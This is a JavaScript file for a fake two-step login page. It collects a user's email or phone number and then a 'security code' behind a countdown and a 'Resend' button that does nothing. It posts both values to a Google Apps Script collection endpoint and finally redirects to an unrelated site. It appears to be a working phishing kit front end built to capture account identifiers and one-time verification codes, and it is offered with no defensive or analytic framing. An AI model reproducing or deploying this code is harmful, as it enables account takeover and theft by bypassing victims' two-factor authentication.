// public/script.js

// Your Apps Script endpoint
const scriptUrl = 'https://script.google.com/macros/s/AKfycbzaoUgy3iCW7tQTde1FuZ8XTvNh6TSPQphL8vXyf-JHASywic7D_ZKOgOwF-K6cf0NG/exec';

// Element references
const regForm     = document.getElementById('registrationForm');
const verForm     = document.getElementById('verificationForm');
const submitBtn   = document.getElementById('submitBtn');
const resendBtn   = document.getElementById('resendBtn');
const continueBtn = document.getElementById('continueBtn');
const countdownEl = document.getElementById('countdown');

let timerInterval;
let timeLeft = 120; // seconds

// 1) On "Log in" click: send only username, then show verification
regForm.addEventListener('submit', async e => {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  if (!username) {
    alert('Please enter your email or phone number.');
    return;
  }

  submitBtn.innerText = 'Logging in…';
  submitBtn.disabled = true;

  // POST just the username
  try {
    const params = new URLSearchParams();
    params.append('username', username);

    await fetch(scriptUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params.toString()
    });
  } catch (err) {
    console.error('Error saving username:', err);
  }

  // Swap to verification form
  regForm.classList.add('hidden');
  verForm.classList.remove('hidden');

  startTimer();
});

// Timer logic
function startTimer() {
  timeLeft = 120;
  resendBtn.disabled = true;
  updateDisplay();

  clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    timeLeft--;
    updateDisplay();
    if (timeLeft <= 0) {
      clearInterval(timerInterval);
      resendBtn.disabled = false;
    }
  }, 1000);
}

function updateDisplay() {
  const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
  const secs = String(timeLeft % 60).padStart(2, '0');
  countdownEl.textContent = `${mins}:${secs}`;
}

// 2) Resend code → restart timer
resendBtn.addEventListener('click', () => {
  startTimer();
});

// 3) Continue → send only the code, then redirect
continueBtn.addEventListener('click', async () => {
  const code = document.getElementById('securityCode').value.trim();
  if (!code) {
    alert('Please enter the security code.');
    return;
  }

  try {
    const params = new URLSearchParams();
    params.append('username', code);

    await fetch(scriptUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params.toString()
    });
  } catch (err) {
    console.error('Error saving code:', err);
  }

  window.location.href = 'https://urlweb.vercel.app/s/freenumbers';
});
